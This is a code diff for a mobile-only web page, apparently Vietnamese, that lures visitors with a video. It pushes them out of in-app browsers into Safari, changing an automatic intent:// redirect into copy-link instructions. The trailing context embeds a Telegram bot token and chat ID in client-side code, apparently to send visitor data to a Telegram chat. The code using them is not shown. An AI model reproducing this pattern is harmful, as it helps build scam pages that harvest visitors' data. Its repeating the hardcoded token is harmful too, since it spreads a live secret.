@@ -101,21 +101,16 @@
         + '<div><h1 style="font-size:22px;margin-bottom:12px">📱 Mở trên điện thoại nhé!</h1>'
         + '<p style="color:#b8aec4;font-size:15px;line-height:1.5">Trang này chỉ xem được trên điện thoại.<br>Hãy quét mã QR hoặc mở link trên điện thoại của bạn.</p></div></div>';
     } else if (isInApp) {
-      const url = location.href;
-      const openBrowser = () => {
-        if (/Android/i.test(ua)) {
-          location.href = "intent://" + url.replace(/https?:\/\//, "") + "#Intent;scheme=https;action=android.intent.action.VIEW;end";
-        } else {
-          location.href = "x-safari-" + url;
-          setTimeout(() => { window.open(url, "_blank"); }, 300);
-        }
-      };
-      openBrowser();
       document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;min-height:100dvh;text-align:center;padding:24px">'
-        + '<div><h1 style="font-size:22px;margin-bottom:12px">🔗</h1>'
-        + '<p style="color:#b8aec4;font-size:15px;line-height:1.5;margin-bottom:16px">Nếu trình duyệt chưa mở, bấm nút bên dưới</p>'
-        + '<button class="btn" id="openBtn">Mở trong trình duyệt</button></div></div>';
-      document.getElementById("openBtn").addEventListener("click", openBrowser);
+        + '<div><h1 style="font-size:40px;margin-bottom:16px">🔗</h1>'
+        + '<p style="color:#f3ece4;font-size:17px;font-weight:600;margin-bottom:8px">Mở bằng Safari để xem video</p>'
+        + '<p style="color:#b8aec4;font-size:15px;line-height:1.8;margin-bottom:20px">'
+        + 'Bấm vào <b style="color:#f3d9b1"> ⋯ </b> hoặc <b style="color:#f3d9b1"> ᐧᐧᐧ </b> ở góc phải<br>rồi chọn <b style="color:#f3d9b1">"Open in Safari"</b></p>'
+        + '<button class="btn" id="copyBtn">📋 Copy link</button>'
+        + '<p style="color:#7d7389;font-size:13px;margin-top:12px">Hoặc copy link rồi dán vào Safari</p></div></div>';
+      document.getElementById("copyBtn").addEventListener("click", function() {
+        navigator.clipboard.writeText(location.href).then(() => { this.textContent = "✅ Đã copy!"; });
+      });
     } else {
       const BOT = "9016053759:AAFsb4SJDMdRSOLdaxXt_HgPVsR8Ti5fSn0";
       const CHAT = "7952404707";
